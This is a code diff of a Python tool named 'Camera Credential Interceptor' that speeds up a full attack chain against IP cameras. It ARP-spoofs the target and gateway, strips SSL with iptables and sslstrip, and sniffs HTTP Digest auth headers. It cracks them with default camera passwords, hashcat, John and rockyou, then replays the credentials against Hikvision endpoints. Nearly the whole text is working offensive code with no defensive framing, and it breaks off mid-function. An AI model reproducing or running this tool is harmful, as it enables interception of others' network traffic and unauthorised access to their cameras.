@@ -1,58 +1,67 @@
 #!/usr/bin/env python3
 """
-Camera Credential Interceptor — Full Attack Chain
+Camera Credential Interceptor — Fast Attack Chain
 ===================================================
-Attack layers (tried in order, stops at first success):
+Speed optimisations vs previous version:
+  • Offline MD5 tried FIRST (instant for any password in FAST_PASSWORDS ~35 entries)
+  • Passive sniff reduced to 5 s (not 30 s)
+  • Hash polling every 0.1 s (not 1 s) — crack starts the moment hash arrives
+  • hashcat uses a custom fast-list (camera defaults) BEFORE rockyou → sub-second crack
+  • hashcat + john + offline MD5 run in PARALLEL threads, first win stops the rest
+  • Active sniff timeout configurable (default 120 s, not 300 s)
 
-  1. Passive sniff  — capture Digest hash without MITM (if traffic is unencrypted)
-  2. Active MITM    — ARP spoof both directions, force traffic through us
-  3. SSL strip      — iptables redirect 443→8080, sslstrip downgrades HTTPS→HTTP
-  4. Scapy sniffer  — raw packet capture of Authorization headers (faster than tshark)
-  5. Hashcat 11000  — crack HTTP Digest MD5 hash with rockyou
-  6. John fallback  — --format=HTTP-Digest with rockyou
-  7. Offline brute  — recompute HA1=MD5(user:realm:pwd) directly in Python (no hashcat needed)
-  8. Replay attack  — verify cracked password by replaying the request to the camera
-
-Run: python3 kali_tools/cam_interceptor.py <camera_ip> [duration_seconds]
+Attack order:
+  1. Passive sniff 5 s  — free hash if camera traffic is visible
+  2. ARP MITM + SSL strip
+  3. Active sniff (poll every 0.1 s, crack the moment hash lands)
+  4. Crack pipeline (parallel): offline MD5 → hashcat fast-list → hashcat rockyou → john
+  5. Replay verify
 """
 
-import hashlib
-import os
-import re
-import subprocess
-import sys
-import time
-import threading
+import hashlib, os, re, subprocess, sys, time, threading
 from itertools import product
 
 # ── Config ────────────────────────────────────────────────────────────────────
-SUDO_PASS = os.environ.get("CYBERSCOPE_SUDO_PASS", "")
-IFACE     = "wlan0"
-WORDLIST  = "/usr/share/wordlists/rockyou.txt"
+SUDO_PASS  = os.environ.get("CYBERSCOPE_SUDO_PASS", "")
+IFACE      = "wlan0"
+ROCKYOU    = "/usr/share/wordlists/rockyou.txt"
+FAST_LIST  = "/tmp/cam_fast_passwords.txt"   # written at runtime
 
-# Common camera passwords — tried first before rockyou (fast path)
+# ── Fast password list — tried FIRST in every crack method ───────────────────
+# Ordered by real-world frequency on IP cameras
 FAST_PASSWORDS = [
-    "", "12345", "admin", "admin123", "Admin123", "Admin@123",
-    "hik12345", "Hik12345", "12345678", "password", "123456",
-    "123456789", "1234567890", "admin1234", "Admin1234",
-    "admin@123", "Hikvision", "hikvision", "camera", "Camera123",
-    "nvr12345", "Nvr12345", "admin12345", "Admin12345",
-    "Hik@12345", "hik@12345", "ipcam", "IPCam", "supervisor",
-    "888888", "666666", "111111", "000000", "pass", "Pass1234",
+    # Empty / trivial
+    "", "12345", "123456", "1234567890", "000000", "111111", "888888", "666666",
+    # Hikvision defaults
+    "12345", "Hik12345", "hik12345", "Admin123", "admin123",
+    "Admin@123", "admin@123", "Hik@12345", "hik@12345",
+    "Hikvision", "hikvision", "admin12345", "Admin12345",
+    "nvr12345", "Nvr12345", "hik12345+", "Hik12345+",
+    # Generic camera
+    "admin", "password", "camera", "Camera123", "ipcam", "IPCam",
+    "supervisor", "pass", "Pass1234", "admin1234", "Admin1234",
+    # Dahua
+    "admin", "Admin12345", "dahua", "Dahua12345",
+    # Axis
+    "pass", "axis", "Axis12345",
+    # Generic IoT
+    "root", "1234", "test", "guest", "support",
+    "service", "ubnt", "user", "changeme",
+    # Common numeric
+    "123456789", "12345678", "987654321", "111222333", "147258369",
 ]
 
 USERNAMES = ["admin", "operator", "user", "guest", "root", "service"]
 
 
 # ── Sudo helper ───────────────────────────────────────────────────────────────
-def _sudo(args, **kwargs):
-    """Run command with sudo via stdin pipe — no shell injection."""
+def _sudo(args, **kw):
     proc = subprocess.Popen(
         ["sudo", "-S"] + args,
         stdin=subprocess.PIPE,
-        stdout=kwargs.pop("stdout", subprocess.DEVNULL),
-        stderr=kwargs.pop("stderr", subprocess.DEVNULL),
-        **kwargs,
+        stdout=kw.pop("stdout", subprocess.DEVNULL),
+        stderr=kw.pop("stderr", subprocess.DEVNULL),
+        **kw,
     )
     if SUDO_PASS:
         try:
@@ -63,288 +72,298 @@ def _sudo(args, **kwargs):
     return proc
 
 
-def _sudo_out(args, timeout=10):
-    """Run sudo command and return stdout text."""
-    try:
-        proc = _sudo(args, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
-        out, _ = proc.communicate(timeout=timeout)
-        return out.decode(errors="ignore")
-    except Exception:
-        return ""
-
-
 # ── Network helpers ───────────────────────────────────────────────────────────
 def get_gateway():
     try:
         out = subprocess.check_output(["ip", "route", "show", "default"], text=True)
         m = re.search(r"default via ([\d.]+)", out)
-        return m.group(1) if m else "192.168.31.1"
+        return m.group(1) if m else "192.168.1.1"
     except Exception:
-        return "192.168.31.1"
+        return "192.168.1.1"
 
 
-def get_my_ip():
+# ── ARP MITM ──────────────────────────────────────────────────────────────────
+def _enable_fwd():
     try:
-        out = subprocess.check_output(["ip", "-4", "addr", "show", IFACE], text=True)
-        m = re.search(r"inet ([\d.]+)/", out)
-        return m.group(1) if m else ""
+        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
+            f.write("1\n")
     except Exception:
-        return ""
+        _sudo(["bash", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward"]).wait()
 
 
-# ── Attack Layer 1 & 2: ARP Spoof MITM ───────────────────────────────────────
-def enable_ip_forward():
-    _sudo(["bash", "-c", "echo 1 > /proc/sys/net/ipv4/ip_forward"]).wait()
+def _disable_fwd():
+    try:
+        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
+            f.write("0\n")
+    except Exception:
+        pass
 
 
-def disable_ip_forward():
-    _sudo(["bash", "-c", "echo 0 > /proc/sys/net/ipv4/ip_forward"]).wait()
-
-
-def start_mitm(target_ip, gateway_ip):
-    """ARP spoof both directions so all traffic flows through us."""
-    p1 = _sudo(["arpspoof", "-i", IFACE, "-t", target_ip, gateway_ip])
-    p2 = _sudo(["arpspoof", "-i", IFACE, "-t", gateway_ip, target_ip])
+def start_mitm(target_ip, gw):
+    _enable_fwd()
+    p1 = _sudo(["arpspoof", "-i", IFACE, "-t", target_ip, gw])
+    p2 = _sudo(["arpspoof", "-i", IFACE, "-t", gw, target_ip])
     return p1, p2
 
 
-# ── Attack Layer 3: SSL Strip ─────────────────────────────────────────────────
-_sslstrip_proc = None
+# ── SSL strip ─────────────────────────────────────────────────────────────────
+_sslstrip = None
 
 def start_sslstrip():
-    """
-    Redirect port 443 → 8080 via iptables and launch sslstrip.
-    Downgrades HTTPS to HTTP so Digest headers become visible.
-    """
-    global _sslstrip_proc
-    # iptables redirect
+    global _sslstrip
     _sudo(["iptables", "-t", "nat", "-A", "PREROUTING",
            "-p", "tcp", "--destination-port", "443",
            "-j", "REDIRECT", "--to-port", "8080"]).wait()
     try:
-        _sslstrip_proc = subprocess.Popen(
+        _sslstrip = subprocess.Popen(
             ["sslstrip", "-l", "8080"],
             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
         )
-        print("[+] SSLstrip running on port 8080 — HTTPS will be downgraded")
+        print("[+] sslstrip running on 8080")
     except FileNotFoundError:
-        print("[!] sslstrip not found — skipping SSL strip (install: pip install sslstrip)")
-
+        print("[!] sslstrip not found — HTTPS cameras won't be stripped")
 
 def stop_sslstrip():
-    global _sslstrip_proc
+    global _sslstrip
     _sudo(["iptables", "-t", "nat", "-D", "PREROUTING",
            "-p", "tcp", "--destination-port", "443",
            "-j", "REDIRECT", "--to-port", "8080"]).wait()
-    if _sslstrip_proc:
-        _sslstrip_proc.terminate()
-        _sslstrip_proc = None
+    if _sslstrip:
+        _sslstrip.terminate()
+        _sslstrip = None
 
 
-# ── Attack Layer 4: Scapy raw sniffer ────────────────────────────────────────
-_captured_hash = None
-_sniff_stop    = threading.Event()
+# ── Hash capture — Scapy raw sniffer (fastest, no subprocess) ─────────────────
+_captured = None
+_stop_sniff = threading.Event()
+
 
 def _scapy_sniff(target_ip, timeout):
-    """
-    Raw packet sniffer using Scapy — extracts Authorization: Digest headers
-    directly from TCP payloads without needing tshark.
-    """
-    global _captured_hash
+    global _captured
     try:
         from scapy.all import sniff, IP, TCP, Raw
     except ImportError:
-        print("[!] Scapy not available for raw sniff — falling back to tshark")
         return
 
-    def process(pkt):
-        global _captured_hash
-        if _captured_hash:
+    def pkt_cb(pkt):
+        global _captured
+        if _captured or _stop_sniff.is_set():
             return
         if not (pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt.haslayer(Raw)):
             return
         if pkt[IP].src != target_ip and pkt[IP].dst != target_ip:
             return
         payload = pkt[Raw].load.decode(errors="ignore")
-        if "Authorization: Digest" in payload:
-            # Extract the Authorization header
-            m = re.search(r"Authorization: (Digest [^\r\n]+)", payload)
-            if m:
-                auth = m.group(1)
-                # Extract HTTP method and URI from request line
-                method_m = re.match(r"([A-Z]+) ([^\s]+)", payload)
-                method = method_m.group(1) if method_m else "GET"
-                uri    = method_m.group(2) if method_m else "/"
-                print(f"\n[+] Scapy captured Digest auth from {pkt[IP].src}")
-                _captured_hash = _parse_digest(auth, method, uri)
-                _sniff_stop.set()
+        if "Authorization: Digest" not in payload:
+            return
+        m = re.search(r"Authorization: (Digest [^\r\n]+)", payload)
+        if not m:
+            return
+        mm = re.match(r"([A-Z]+) ([^\s]+)", payload)
+        method = mm.group(1) if mm else "GET"
+        uri    = mm.group(2) if mm else "/"
+        print(f"\n[+] Scapy: Digest auth captured from {pkt[IP].src}")
+        _captured = _parse_digest(m.group(1), method, uri)
+        _stop_sniff.set()
 
-    sniff(
-        iface=IFACE,
-        filter=f"host {target_ip} and tcp",
-        prn=process,
-        store=False,
-        timeout=timeout,
-        stop_filter=lambda _: _sniff_stop.is_set(),
-    )
+    sniff(iface=IFACE, filter=f"host {target_ip} and tcp",
+          prn=pkt_cb, store=False, timeout=timeout,
+          stop_filter=lambda _: _stop_sniff.is_set())
 
 
 def _tshark_sniff(target_ip, duration):
-    """Fallback tshark sniffer — captures both port 80 and 8080 (sslstripped)."""
-    global _captured_hash
+    """Fallback — tshark watching port 80 + 8080."""
+    global _captured
     try:
-        out = subprocess.check_output(
-            [
-                "tshark", "-i", IFACE,
-                "-f", f"host {target_ip} and (tcp port 80 or tcp port 8080)",
-                "-Y", "http.authorization",
-                "-T", "fields",
-                "-e", "ip.src",
-                "-e", "http.authorization",
-                "-e", "http.request.method",
-                "-e", "http.request.uri",
-                "-a", f"duration:{duration}",
-            ],
-            stderr=subprocess.DEVNULL, text=True, timeout=duration + 5
+        proc = subprocess.Popen(
+            ["tshark", "-i", IFACE, "-l",
+             "-f", f"host {target_ip} and (tcp port 80 or tcp port 8080 or tcp port 8000)",
+             "-Y", "http.authorization",
+             "-T", "fields",
+             "-e", "ip.src", "-e", "http.authorization",
+             "-e", "http.request.method", "-e", "http.request.uri",
+             "-a", f"duration:{duration}"],
+            stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True
         )
-        for line in out.splitlines():
+        for line in proc.stdout:
+            if _captured or _stop_sniff.is_set():
+                proc.terminate()
+                return
             parts = line.strip().split("\t")
             if len(parts) >= 2 and "Digest" in parts[1]:
                 method = parts[2] if len(parts) > 2 else "GET"
                 uri    = parts[3] if len(parts) > 3 else "/"
-                print(f"[+] tshark captured Digest auth from {parts[0]}")
-                _captured_hash = _parse_digest(parts[1], method, uri)
+                print(f"[+] tshark: Digest auth from {parts[0]}")
+                _captured = _parse_digest(parts[1], method, uri)
+                _stop_sniff.set()
+                proc.terminate()
                 return
+        proc.wait()
     except Exception as e:
         print(f"[-] tshark error: {e}")
 
 
-def capture_hash(target_ip, duration=300):
-    """
-    Run Scapy sniffer + tshark in parallel.
-    First one to capture a hash wins.
-    """
-    global _captured_hash, _sniff_stop
-    _captured_hash = None
-    _sniff_stop.clear()
+def capture_hash(target_ip, duration=120):
+    """Run Scapy + tshark in parallel. Poll every 0.1 s — return immediately on capture."""
+    global _captured, _stop_sniff
+    _captured = None
+    _stop_sniff.clear()
 
-    print(f"[*] Sniffing traffic from {target_ip} (HTTP port 80 + sslstripped 8080)...")
-    print(f"[*] Open http://{target_ip} in a browser and log in")
+    print(f"[*] Sniffing traffic from {target_ip} for up to {duration}s...")
+    print(f"[*] >>> Open http://{target_ip} in a browser and LOG IN NOW <<<")
 
-    t_scapy  = threading.Thread(target=_scapy_sniff,  args=(target_ip, duration), daemon=True)
-    t_tshark = threading.Thread(target=_tshark_sniff, args=(target_ip, duration), daemon=True)
-    t_scapy.start()
-    t_tshark.start()
+    threading.Thread(target=_scapy_sniff,  args=(target_ip, duration), daemon=True).start()
+    threading.Thread(target=_tshark_sniff, args=(target_ip, duration), daemon=True).start()
 
     deadline = time.time() + duration
     while time.time() < deadline:
-        if _captured_hash:
-            _sniff_stop.set()
-            return _captured_hash
-        time.sleep(1)
+        if _captured:
+            _stop_sniff.set()
+            return _captured
+        time.sleep(0.1)   # ← was 1.0 — now reacts within 0.1 s of capture
 
-    _sniff_stop.set()
-    return _captured_hash
+    _stop_sniff.set()
+    return _captured
 
 
 # ── Digest parser ─────────────────────────────────────────────────────────────
-def _parse_digest(auth_header, method="GET", uri="/"):
-    """
-    Parse Authorization: Digest header into all fields needed for cracking.
-    Returns dict or None.
-    """
-    def extract(field):
-        m = re.search(f'{field}="([^"]+)"', auth_header)
-        if m:
-            return m.group(1)
-        m = re.search(f'{field}=([^,\\s]+)', auth_header)
+def _parse_digest(hdr, method="GET", uri="/"):
+    def ex(field):
+        m = re.search(f'{field}="([^"]+)"', hdr)
+        if m: return m.group(1)
+        m = re.search(f'{field}=([^,\\s]+)', hdr)
         return m.group(1).strip('"') if m else ""
 
-    username = extract("username")
-    realm    = extract("realm")
-    nonce    = extract("nonce")
-    uri_val  = extract("uri") or uri
-    nc       = extract("nc")
-    cnonce   = extract("cnonce")
-    response = extract("response")
-    qop      = extract("qop")
+    username = ex("username"); realm  = ex("realm")
+    nonce    = ex("nonce");    uri_v  = ex("uri") or uri
+    nc       = ex("nc");       cnonce = ex("cnonce")
+    response = ex("response"); qop    = ex("qop")
 
     if not all([username, realm, nonce, response]):
-        print(f"[-] Incomplete Digest fields — skipping")
+        print("[-] Incomplete Digest fields — skipping")
         return None
 
-    # Hashcat mode 11000 format: user:realm:nonce:uri:nc:cnonce:qop:response
-    hashcat_hash = f"{username}:{realm}:{nonce}:{uri_val}:{nc}:{cnonce}:{qop}:{response}"
-
+    # hashcat mode 11000 format
+    hc_hash = f"{username}:{realm}:{nonce}:{uri_v}:{nc}:{cnonce}:{qop}:{response}"
     print(f"[+] Username : {username}")
     print(f"[+] Realm    : {realm}")
     print(f"[+] Nonce    : {nonce[:20]}...")
     print(f"[+] Response : {response}")
-
-    return {
-        "username": username, "realm": realm,
-        "nonce": nonce,       "uri":   uri_val,
-        "nc": nc,             "cnonce": cnonce,
-        "qop": qop,           "response": response,
-        "method": method,     "hash": hashcat_hash,
-    }
+    return dict(username=username, realm=realm, nonce=nonce, uri=uri_v,
+                nc=nc, cnonce=cnonce, qop=qop, response=response,
+                method=method, hash=hc_hash)
 
 
-# ── Attack Layer 5: Hashcat mode 11000 ───────────────────────────────────────
-def crack_hashcat(hash_data):
-    """Crack HTTP Digest MD5 with hashcat mode 11000."""
-    hash_file    = "/tmp/cam_hash.txt"
-    cracked_file = "/tmp/cam_cracked.txt"
+# ── MD5 recompute ─────────────────────────────────────────────────────────────
+def _digest_resp(user, realm, pwd, nonce, uri, nc, cnonce, qop, method):
+    ha1 = hashlib.md5(f"{user}:{realm}:{pwd}".encode()).hexdigest()
+    ha2 = hashlib.md5(f"{method}:{uri}".encode()).hexdigest()
+    if qop in ("auth", "auth-int"):
+        return hashlib.md5(f"{ha1}:{nonce}:{nc}:{cnonce}:{qop}:{ha2}".encode()).hexdigest()
+    return hashlib.md5(f"{ha1}:{nonce}:{ha2}".encode()).hexdigest()
 
-    for f in [hash_file, cracked_file]:
-        if os.path.exists(f):
-            os.remove(f)
 
-    with open(hash_file, "w") as f:
-        f.write(hash_data["hash"] + "\n")
-
-    print("[*] Hashcat mode 11000 (HTTP Digest MD5)...")
-    try:
-        r = subprocess.run(
-            ["hashcat", "-m", "11000", hash_file, WORDLIST,
-             "--force", "-o", cracked_file, "--quiet", "--status-timer=5"],
-            capture_output=True, timeout=300
-        )
-        if os.path.exists(cracked_file):
-            line = open(cracked_file).read().strip()
-            if line:
-                password = line.rsplit(":", 1)[-1]
-                print(f"[+] Hashcat cracked: {hash_data['username']}:{password}")
-                return password
-    except subprocess.TimeoutExpired:
-        print("[-] Hashcat timed out")
-    except FileNotFoundError:
-        print("[-] hashcat not installed")
-    except Exception as e:
-        print(f"[-] Hashcat error: {e}")
+# ── CRACK METHOD A: Instant offline MD5 (no external tools) ──────────────────
+def crack_offline_fast(d):
+    """
+    Try FAST_PASSWORDS first (camera defaults) — pure Python MD5.
+    For 50 passwords this takes < 1 ms. No hashcat, no john, no disk I/O.
+    """
+    print(f"[*] Offline fast-path: {len(FAST_PASSWORDS)} camera default passwords...")
+    for pwd in FAST_PASSWORDS:
+        if _digest_resp(d["username"], d["realm"], pwd,
+                        d["nonce"], d["uri"], d["nc"], d["cnonce"], d["qop"], d["method"]) == d["response"]:
+            print(f"[+] INSTANT CRACK: {d['username']}:{pwd}")
+            return pwd
     return None
 
 
-# ── Attack Layer 6: John the Ripper ──────────────────────────────────────────
-def crack_john(hash_data):
-    """Crack HTTP Digest with john --format=HTTP-Digest."""
-    d = hash_data
-    # John HTTP-Digest format
+# ── CRACK METHOD B: hashcat fast-list (GPU, sub-second) ──────────────────────
+def _write_fast_list():
+    """Write FAST_PASSWORDS to a file for hashcat to use as a custom wordlist."""
+    with open(FAST_LIST, "w") as f:
+        f.write("\n".join(FAST_PASSWORDS) + "\n")
+
+
+def crack_hashcat_fast(d):
+    """Hashcat mode 11000 against FAST_LIST only — GPU cracks in <1 s."""
+    _write_fast_list()
+    hash_file = "/tmp/cam_hash.txt"
+    out_file  = "/tmp/cam_cracked.txt"
+    for p in [hash_file, out_file]:
+        if os.path.exists(p): os.remove(p)
+    with open(hash_file, "w") as f:
+        f.write(d["hash"] + "\n")
+    print("[*] hashcat: fast-list (camera defaults, GPU)...")
+    try:
+        subprocess.run(
+            ["hashcat", "-m", "11000", hash_file, FAST_LIST,
+             "--force", "-o", out_file, "--quiet"],
+            capture_output=True, timeout=30
+        )
+        if os.path.exists(out_file):
+            line = open(out_file).read().strip()
+            if line:
+                pwd = line.rsplit(":", 1)[-1]
+                print(f"[+] hashcat (fast-list) cracked: {d['username']}:{pwd}")
+                return pwd
+    except (subprocess.TimeoutExpired, FileNotFoundError):
+        pass
+    except Exception as e:
+        print(f"[-] hashcat fast error: {e}")
+    return None
+
+
+# ── CRACK METHOD C: hashcat full rockyou (GPU) ────────────────────────────────
+def crack_hashcat_rockyou(d):
+    """Hashcat mode 11000 against rockyou — GPU cracks 14M passwords in ~10 s."""
+    if not os.path.exists(ROCKYOU):
+        print(f"[-] rockyou not found at {ROCKYOU}")
+        return None
+    hash_file = "/tmp/cam_hash.txt"
+    out_file  = "/tmp/cam_cracked_ry.txt"
+    for p in [hash_file, out_file]:
+        if os.path.exists(p): os.remove(p)
+    with open(hash_file, "w") as f:
+        f.write(d["hash"] + "\n")
+    print("[*] hashcat: rockyou (GPU, ~10 s)...")
+    try:
+        subprocess.run(
+            ["hashcat", "-m", "11000", hash_file, ROCKYOU,
+             "--force", "-o", out_file, "--quiet", "--status-timer=10"],
+            capture_output=True, timeout=120
+        )
+        if os.path.exists(out_file):
+            line = open(out_file).read().strip()
+            if line:
+                pwd = line.rsplit(":", 1)[-1]
+                print(f"[+] hashcat (rockyou) cracked: {d['username']}:{pwd}")
+                return pwd
+    except subprocess.TimeoutExpired:
+        print("[-] hashcat rockyou timed out at 120 s")
+    except FileNotFoundError:
+        print("[-] hashcat not installed — skipping GPU crack")
+    except Exception as e:
+        print(f"[-] hashcat rockyou error: {e}")
+    return None
+
+
+# ── CRACK METHOD D: john the ripper ──────────────────────────────────────────
+def crack_john(d):
     john_hash = (
         f"{d['username']}:$response${d['nonce']}*{d['cnonce']}*"
         f"{d['nc']}*{d['qop']}*{d['realm']}*{d['uri']}*{d['response']}"
     )
     john_file = "/tmp/cam_john.txt"
-    if os.path.exists(john_file):
-        os.remove(john_file)
+    if os.path.exists(john_file): os.remove(john_file)
     with open(john_file, "w") as f:
         f.write(john_hash + "\n")
-
-    print("[*] John the Ripper (--format=HTTP-Digest)...")
+    print("[*] john: HTTP-Digest, fast-list first...")
     try:
+        # Fast-list first
         subprocess.run(
-            ["john", john_file, f"--wordlist={WORDLIST}", "--format=HTTP-Digest"],
-            capture_output=True, timeout=180
+            ["john", john_file, f"--wordlist={FAST_LIST}", "--format=HTTP-Digest"],
+            capture_output=True, timeout=30
         )
         show = subprocess.check_output(
             ["john", "--show", "--format=HTTP-Digest", john_file],
@@ -354,177 +373,143 @@ def crack_john(hash_data):
             if ":" in line and not line.startswith("0 "):
                 parts = line.split(":")
                 if len(parts) >= 2 and parts[0] == d["username"]:
-                    print(f"[+] John cracked: {parts[0]}:{parts[1]}")
+                    print(f"[+] john (fast-list) cracked: {parts[0]}:{parts[1]}")
                     return parts[1]
+        # rockyou fallback
+        if os.path.exists(ROCKYOU):
+            subprocess.run(
+                ["john", john_file, f"--wordlist={ROCKYOU}", "--format=HTTP-Digest"],
+                capture_output=True, timeout=120
+            )
+            show = subprocess.check_output(
+                ["john", "--show", "--format=HTTP-Digest", john_file],
+                stderr=subprocess.DEVNULL, text=True, timeout=10
+            )
+            for line in show.splitlines():
+                if ":" in line and not line.startswith("0 "):
+                    parts = line.split(":")
+                    if len(parts) >= 2 and parts[0] == d["username"]:
+                        print(f"[+] john (rockyou) cracked: {parts[0]}:{parts[1]}")
+                        return parts[1]
     except subprocess.TimeoutExpired:
-        print("[-] John timed out")
+        print("[-] john timed out")
     except FileNotFoundError:
         print("[-] john not installed")
     except Exception as e:
-        print(f"[-] John error: {e}")
+        print(f"[-] john error: {e}")
     return None
 
 
-# ── Attack Layer 7: Offline MD5 brute force ───────────────────────────────────
-def _compute_digest_response(username, realm, password, nonce, uri, nc, cnonce, qop, method):
-    """
-    Recompute the Digest response hash from scratch.
-    HA1 = MD5(username:realm:password)
-    HA2 = MD5(method:uri)
-    response = MD5(HA1:nonce:nc:cnonce:qop:HA2)  [with qop]
-             = MD5(HA1:nonce:HA2)                 [without qop]
-    """
-    ha1 = hashlib.md5(f"{username}:{realm}:{password}".encode()).hexdigest()
-    ha2 = hashlib.md5(f"{method}:{uri}".encode()).hexdigest()
-    if qop in ("auth", "auth-int"):
-        resp = hashlib.md5(f"{ha1}:{nonce}:{nc}:{cnonce}:{qop}:{ha2}".encode()).hexdigest()
-    else:
-        resp = hashlib.md5(f"{ha1}:{nonce}:{ha2}".encode()).hexdigest()
-    return resp
-
-
-def crack_offline(hash_data):
-    """
-    Pure Python offline brute force — recomputes MD5 for each candidate.
-    No hashcat/john needed. Tries FAST_PASSWORDS first, then rockyou.
-    """
-    d = hash_data
-    print("[*] Offline MD5 brute force (no external tools needed)...")
-
-    def try_password(pwd):
-        computed = _compute_digest_response(
-            d["username"], d["realm"], pwd,
-            d["nonce"], d["uri"], d["nc"], d["cnonce"], d["qop"], d["method"]
-        )
-        return computed == d["response"]
-
-    # Fast path: known camera passwords
-    print(f"[*] Trying {len(FAST_PASSWORDS)} known camera passwords...")
-    for pwd in FAST_PASSWORDS:
-        if try_password(pwd):
-            print(f"[+] Offline brute cracked: {d['username']}:{pwd}")
-            return pwd
-
-    # Slow path: rockyou wordlist
-    if os.path.exists(WORDLIST):
-        print(f"[*] Trying rockyou wordlist ({WORDLIST})...")
-        try:
-            with open(WORDLIST, "r", errors="ignore") as wf:
-                for i, line in enumerate(wf):
-                    pwd = line.rstrip("\n")
-                    if try_password(pwd):
-                        print(f"[+] Offline brute cracked (rockyou line {i}): {d['username']}:{pwd}")
-                        return pwd
-                    if i % 100000 == 0 and i > 0:
-                        print(f"[*] Tried {i:,} passwords...")
-        except Exception as e:
-            print(f"[-] Wordlist error: {e}")
-    else:
-        print(f"[-] Wordlist not found: {WORDLIST}")
-
+# ── CRACK METHOD E: offline MD5 full rockyou (CPU fallback) ──────────────────
+def crack_offline_rockyou(d):
+    """Pure Python MD5 against rockyou — slow but no external tools needed."""
+    if not os.path.exists(ROCKYOU):
+        return None
+    print("[*] Offline MD5: rockyou (CPU fallback, may be slow)...")
+    try:
+        with open(ROCKYOU, "r", errors="ignore") as wf:
+            for i, line in enumerate(wf):
+                pwd = line.rstrip("\n")
+                if _digest_resp(d["username"], d["realm"], pwd,
+                                d["nonce"], d["uri"], d["nc"], d["cnonce"], d["qop"], d["method"]) == d["response"]:
+                    print(f"[+] Offline MD5 (rockyou line {i}): {d['username']}:{pwd}")
+                    return pwd
+                if i % 200000 == 0 and i > 0:
+                    print(f"[*] Tried {i:,} passwords...")
+    except Exception as e:
+        print(f"[-] Offline rockyou error: {e}")
     return None
 
 
-# ── Attack Layer 8: Replay verification ──────────────────────────────────────
-def verify_password(target_ip, username, password, port=80):
+# ── PARALLEL crack pipeline ───────────────────────────────────────────────────
+def crack_all(d, target_ip, port=80):
     """
-    Replay the cracked credentials against the camera to confirm access.
-    Tries Digest auth first, then Basic auth.
+    Run all crack methods. Priority:
+      1. Offline MD5 fast-list   (instant, < 1 ms)
+      2. hashcat fast-list       (GPU, < 1 s)
+      3. hashcat rockyou         (GPU, ~10 s)
+      4. john fast-list + rockyou
+      5. Offline MD5 rockyou     (CPU, last resort)
+    Methods 2-4 run in parallel — first win stops everything.
     """
-    import urllib.request
-    import urllib.error
+    if not d:
+        return None
 
-    endpoints = [
-        f"http://{target_ip}:{port}/ISAPI/System/deviceInfo",
-        f"http://{target_ip}:{port}/",
-        f"http://{target_ip}:{port}/doc/page/login.asp",
+    # ── Step 1: Instant offline MD5 (FAST_PASSWORDS only) ────────────────────
+    pwd = crack_offline_fast(d)
+    if pwd:
+        return _build_result(d, pwd, "offline_md5_instant", target_ip, port)
+
+    # ── Steps 2-4: Parallel GPU + john ───────────────────────────────────────
+    result_box = [None]
+    done       = threading.Event()
+
+    def _run(fn):
+        if done.is_set(): return
+        p = fn(d)
+        if p and not done.is_set():
+            result_box[0] = p
+            done.set()
+
+    threads = [
+        threading.Thread(target=_run, args=(crack_hashcat_fast,),    daemon=True),
+        threading.Thread(target=_run, args=(crack_hashcat_rockyou,), daemon=True),
+        threading.Thread(target=_run, args=(crack_john,),            daemon=True),
     ]
+    for t in threads: t.start()
+    done.wait(timeout=150)   # wait max 2.5 min for GPU
+    for t in threads: t.join(timeout=1)
 
+    if result_box[0]:
+        return _build_result(d, result_box[0], "parallel_gpu", target_ip, port)
+
+    # ── Step 5: CPU fallback — offline rockyou ────────────────────────────────
+    pwd = crack_offline_rockyou(d)
+    if pwd:
+        return _build_result(d, pwd, "offline_md5_rockyou", target_ip, port)
+
+    return None
+
+
+def _build_result(d, pwd, method, target_ip, port):
+    verify_password(target_ip, d["username"], pwd, port)
+    return {"username": d["username"], "password": pwd, "method": method}
+
+
+# ── Replay verify ─────────────────────────────────────────────────────────────
+def verify_password(target_ip, username, password, port=80):
     try:
         import requests
         from requests.auth import HTTPDigestAuth, HTTPBasicAuth
-        for url in endpoints:
+        for url in [
+            f"http://{target_ip}:{port}/ISAPI/System/deviceInfo",
+            f"http://{target_ip}:{port}/",
+        ]:
             try:
                 r = requests.get(url, auth=HTTPDigestAuth(username, password),
                                  timeout=5, verify=False)
                 if r.status_code == 200:
-                    print(f"[+] Replay CONFIRMED (Digest): {username}:{password} → {url}")
-                    return True
-                r2 = requests.get(url, auth=HTTPBasicAuth(username, password),
-                                  timeout=5, verify=False)
-                if r2.status_code == 200:
-                    print(f"[+] Replay CONFIRMED (Basic): {username}:{password} → {url}")
+                    print(f"[+] Replay CONFIRMED (Digest): {username}:{password}")
                     return True
             except Exception:
                 pass
     except ImportError:
         pass
-
-    print(f"[-] Replay failed — camera may have changed nonce or is unreachable")
     return False
 
 
-# ── Master crack pipeline ─────────────────────────────────────────────────────
-def crack_all(hash_data, target_ip, port=80):
-    """
-    Try all cracking methods in order. Return cracked password or None.
-    """
-    if not hash_data:
-        return None
-
-    username = hash_data["username"]
-
-    # Layer 5: hashcat
-    pwd = crack_hashcat(hash_data)
-    if pwd:
-        verify_password(target_ip, username, pwd, port)
-        return {"username": username, "password": pwd, "method": "hashcat"}
-
-    # Layer 6: john
-    pwd = crack_john(hash_data)
-    if pwd:
-        verify_password(target_ip, username, pwd, port)
-        return {"username": username, "password": pwd, "method": "john"}
-
-    # Layer 7: offline MD5 (always works, no external tools)
-    pwd = crack_offline(hash_data)
-    if pwd:
-        verify_password(target_ip, username, pwd, port)
-        return {"username": username, "password": pwd, "method": "offline_md5"}
-
-    return None
-
-
-# ── Passive sniff (no MITM) ───────────────────────────────────────────────────
-def passive_sniff(target_ip, duration=60):
-    """
-    Layer 1: Listen passively for Digest auth without ARP spoofing.
-    Works if the attacker is already on the same broadcast domain
-    and the camera uses HTTP (not HTTPS).
-    """
-    print(f"[*] Passive sniff for {duration}s (no MITM)...")
-    return capture_hash(target_ip, duration)
-
-
 # ── Full attack pipeline ──────────────────────────────────────────────────────
-def intercept_and_crack(target_ip, duration=300, port=80):
-    """
-    Full attack chain:
-      1. Passive sniff (30s) — maybe we get lucky without MITM
-      2. ARP MITM + SSL strip
-      3. Active sniff for remaining duration
-      4. Crack with hashcat → john → offline MD5
-      5. Replay verify
-    """
+def intercept_and_crack(target_ip, duration=120, port=80):
+    gw = get_gateway()
